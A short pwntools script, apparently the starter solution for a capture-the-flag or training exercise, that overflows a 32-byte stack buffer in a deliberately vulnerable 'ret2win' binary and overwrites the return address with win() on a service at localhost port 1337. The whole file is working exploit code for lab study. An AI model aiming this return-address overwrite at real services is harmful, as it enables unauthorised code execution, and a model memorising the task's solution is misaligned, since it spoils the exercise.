#!/usr/bin/env python3
"""Starting-point exploit, dropped into the hunter's home dir.

40 bytes padding (32 buf + 8 saved rbp) then the address of win(). With the
binary built -static -no-pie the win address is link-fixed, so this is
deterministic. Run it against the target already running inside this VM:

    python3 solve.py localhost 1337
"""
from pwn import *
import os
import sys

context.arch = "amd64"
elf = ELF("/app/ret2win") if os.path.exists("/app/ret2win") else ELF("./ret2win")
host, port = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("localhost", 1337)

p = remote(host, port)
p.recvline()
p.send(b"A" * 40 + p64(elf.symbols["win"]))
out = p.recvall(timeout=5).decode(errors="replace")
print(out)
assert "nope" not in out.splitlines()[0] or "{" in out, "exploit failed"
